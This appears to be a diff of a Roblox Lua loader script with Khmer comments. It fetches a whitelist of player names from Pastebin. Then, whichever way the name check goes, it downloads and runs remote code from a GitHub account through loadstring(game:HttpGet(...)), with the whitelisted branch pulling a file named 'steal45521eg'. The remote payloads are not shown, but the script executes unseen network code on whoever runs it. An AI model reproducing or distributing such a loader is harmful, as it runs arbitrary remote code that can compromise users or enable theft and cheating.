@@ -1,34 +1,46 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- ដាក់ Raw Link Pastebin របស់អ្នកនៅទីនេះ
 local pastebinUrl = "https://pastebin.com/raw/d1wW39Xe"
-
 local allowedNames = {}
+
+-- ==========================================
+-- វគ្គទី ១៖ ទាញយកទិន្នន័យពី Pastebin មកទុកក្នុង List ឱ្យរៀបរយ
+-- ==========================================
 local success, response = pcall(function()
     return game:HttpGet(pastebinUrl)
 end)
 
-if success then
-    -- បំបែកឈ្មោះតាមបន្ទាត់នីមួយៗ (Line)
-    for name in response:gmatch("[^\r\n]+") do
-        table.insert(allowedNames, name:match("^%s*(.-)%s*$")) -- លុប Space លើសចេញ
+if success and response then
+    -- បំបែកអត្ថបទតាមបន្ទាត់ ហើយលុប Space ចោល រួចបញ្ចូលទៅក្នុងបញ្ជី allowedNames
+    for line in response:gmatch("[^\r\n]+") do
+        local cleanedName = line:match("^%s*(.-)%s*$") -- លុប Space ខាងដើម និងខាងចុង
+        if cleanedName and cleanedName ~= "" then
+            table.insert(allowedNames, cleanedName)
+        end
     end
+    print("ទាញយកឈ្មោះបានជោគជ័យ! សរុបមាន៖ " .. #allowedNames .. " ឈ្មោះ")
 else
     warn("មិនអាចទាញយកទិន្នន័យពី Pastebin បានទេ: " .. tostring(response))
 end
 
--- ឆែកមើលថាតើឈ្មោះ Player មាននៅក្នុង List ដែរឬទេ
+-- ==========================================
+-- វគ្គទី ២៖ ចាប់ផ្តើមផ្ទៀងផ្ទាត់ឈ្មោះ LocalPlayer
+-- ==========================================
 local isAllowed = false
+
 for _, name in ipairs(allowedNames) do
     if LocalPlayer.Name == name then
         isAllowed = true
-        break
+        break -- បើឃើញឈ្មោះហើយ ឈប់ Search ទៀត
     end
 end
 
+-- ដំណើរការ Code ទៅតាមលទ្ធផលនៃការផ្ទៀងផ្ទាត់
 if isAllowed then
+    print("ឈ្មោះរបស់អ្នកមាននៅក្នុង Whitelist!")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/kokakola1234523/2215/refs/heads/main/steal45521eg"))()
 else
+    warn("ឈ្មោះរបស់អ្នកមិនមាននៅក្នុង Whitelist ទេ!")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/kokakola1234523/2215/refs/heads/main/tte"))()
 end
